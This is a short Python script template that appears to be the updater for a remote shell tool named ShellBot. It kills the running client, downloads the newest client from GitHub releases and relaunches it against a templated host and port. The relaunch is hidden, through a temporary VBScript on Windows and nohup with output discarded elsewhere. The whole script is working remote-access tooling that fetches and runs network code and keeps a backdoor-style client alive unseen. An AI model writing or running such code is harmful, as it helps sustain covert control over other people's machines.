#!/usr/bin/env python3
import os
import sys
import urllib.request
import tempfile
import shutil
import json

def getURL(owner, repo, name):
    repoUrl = 'https://api.github.com/repos/{}/{}/releases/latest'\
              .format(owner, repo)
    response = urllib.request.urlopen(repoUrl)

    json_val = json.loads(response.read().decode())

    for file in json_val['assets']:
        if name == file['name']:
            return file['browser_download_url']

def download(fileUrl, file):
    with urllib.request.urlopen(fileUrl) as response, open(file, 'wb') as out_file:
        shutil.copyfileobj(response, out_file)

if sys.platform == "win32": os.system("taskkill /F /T /PID {pid}")
else: os.system("kill {pid}")

if {frozen}:
    url = getURL('sayak-brm', 'ShellBot', 'client.exe')
    download(url, r"{exe}")
else:
    url = getURL('sayak-brm', 'ShellBot', 'client.py')
    download(url, r"{arg}")

if sys.platform == "win32":
    if {frozen}:
        os.system(r"{exe} {host} {port}")
    else:
        runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
        with open(tempfile.gettempdir() + r"/runner.vbs", "w") as f:
            f.write(runner)
        os.system(tempfile.gettempdir() + r'/runner.vbs "{exe} {arg} {host} {port}"')
else: os.system(r"nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
